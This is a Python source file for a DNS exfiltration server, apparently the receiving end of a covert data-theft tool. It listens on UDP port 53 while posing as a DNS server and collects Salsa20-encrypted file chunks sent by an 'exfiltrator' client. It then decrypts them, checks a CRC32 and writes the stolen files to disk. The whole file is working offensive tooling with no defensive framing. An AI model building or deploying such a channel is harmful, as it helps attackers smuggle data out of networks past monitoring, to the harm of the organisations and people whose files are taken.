import sys
import zlib
import socket
from Crypto.Cipher import Salsa20

# Constants
EAD_BINARY = "rb"
WRITE_BINARY = "wb"
INITIATION_STRING = b"INIT_445"
DELIMITER = b"::"
NULL = b"\x00"
DATA_TERMINATOR = b"\xcc\xcc\xcc\xcc\xff\xff\xff\xff"

SERVER_TIMEOUT_SECONDS=15


def dns_server(host,KEY, port=53, play_dead=True):
    #KEY = KEY.encode()
    """
    This will listen on the 53 port without killing a DNS server if there.
    It will save incoming files from exfiltrator.
    :param host: host to listen on.
    :param port: 53 by default
    :param play_dead: Should i pretend to be a DNS server or just be quiet?
    :return:
    """

    # Try opening socket and listen
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as msg :
        sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        raise

    # Try binding to the socket
    try:
        s.bind((host, port))
        s.settimeout(SERVER_TIMEOUT_SECONDS)   # Server timeout
    except socket.error as msg:
        sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        raise

    print("DNS Socket is up!")
    


    # Will keep connection alive as needed
    while 1:
        try:
            # TO-DO: DNS server is just a listener. We should allow the option of backwards communication.
            # receive data from client (data, addr)
            d = s.recvfrom(1024)
            data = d[0]
            addr = d[1]

        
            if data.find(INITIATION_STRING) != -1:
                # Found initiation packet:
                offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
                filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]


                # Decrypt the filename 
                nonce = filename[:8]
                filename = filename[8:]
                cipher = Salsa20.new(key=KEY, nonce=nonce)

                filename = (cipher.decrypt(filename)).decode("utf-8")
                print(filename)
                # END decrypt filename..

                crc32 = data[offset_delimiter: -1].decode()


                sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
                actual_file = b""
                chunks_count = 0

            elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR) == -1 and data.find(INITIATION_STRING) == -1:
                # Found data packet:
                len_head = len(b"\x00\x00\x01\x00\x01")
                end_of_payload = data.find(DATA_TERMINATOR) # the upper limit of the data to exfiltrate
                end_of_header = data.find(b"\x00\x00\x01\x00\x01")
                
                data = data[end_of_header + len_head: end_of_payload]

                actual_file += data  # adding the length to get the first index of the payload
                chunks_count += 1

            elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR):
                # Found termination packet:
                # Will now compare CRC32s:
                s.settimeout(None)             # disable timeout as data transmission is active
                nonce = actual_file[:8]
                actual_file = actual_file[8:]
                cipher = Salsa20.new(key=KEY, nonce=nonce)
                actual_file = cipher.decrypt(actual_file)
                

                
                if crc32 == str(zlib.crc32(actual_file)):
                    sys.stdout.write("CRC32 match! Now saving file")
                    fh = open(filename + str(crc32), WRITE_BINARY)
                    fh.write(actual_file) 
                    fh.close()
                    replay = "Got it. Thanks :)"
                    s.sendto(replay.encode("utf-8"), addr)

                else:
                    sys.stderr.write("CRC32 not match. Not saving file.")
                    replay = "You fucked up!"
                    s.sendto(replay.encode("utf-8"), addr)

                filename = ""
                crc32 = ""
                i = 0
                addr = ""
            
            else:
                sys.stdout.write("Regular packet. Not listing it.")

        except Exception as e:
            break
    
    print("DNS EXFITRATION SERVER IS GOING DOWN!")
    s.close()
    return 0